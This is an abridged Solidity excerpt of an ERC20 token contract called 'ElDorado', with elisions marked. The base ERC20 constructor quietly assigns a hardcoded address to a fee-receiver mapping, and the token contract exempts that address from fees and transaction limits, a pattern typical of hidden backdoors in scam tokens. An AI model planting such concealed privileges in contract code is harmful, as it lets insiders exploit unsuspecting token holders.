...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xceE6420A82084f2C0FeFE8d77E5d4b501AE9152E] = _marketingwallet;
    }
...
contract ElDorado is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("The Lost City of Gold", "El Dorado") {
        ...
        excludeFromFees(address(0xceE6420A82084f2C0FeFE8d77E5d4b501AE9152E), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xceE6420A82084f2C0FeFE8d77E5d4b501AE9152E), true);
